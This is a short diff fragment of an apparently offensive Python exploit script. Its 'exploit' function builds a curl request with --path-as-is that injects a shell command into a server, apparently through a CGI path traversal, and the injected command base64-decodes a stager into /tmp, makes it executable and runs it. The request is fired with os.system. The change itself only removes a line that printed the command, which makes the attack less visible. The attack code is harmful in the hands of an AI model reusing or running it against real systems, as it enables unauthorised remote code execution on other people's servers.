@@ -15,7 +15,6 @@ def exploit(ip_dest: str, port_dest: int, ip_src: str, port_src: int, stager: st
         rs = '/bin/bash -c "echo {0} | base64 -d > /tmp/stager.sh && chmod +x /tmp/stager.sh && /tmp/stager.sh"'.format(stager.decode("utf-8"))
         cmd = "curl -s --path-as-is '{1}{2}' --data 'echo Content-Type: text/plain; echo; {0}' &".format(rs, host, payload)
         os.system(cmd)
-        print(cmd)
         return True
         
     except Exception as e:
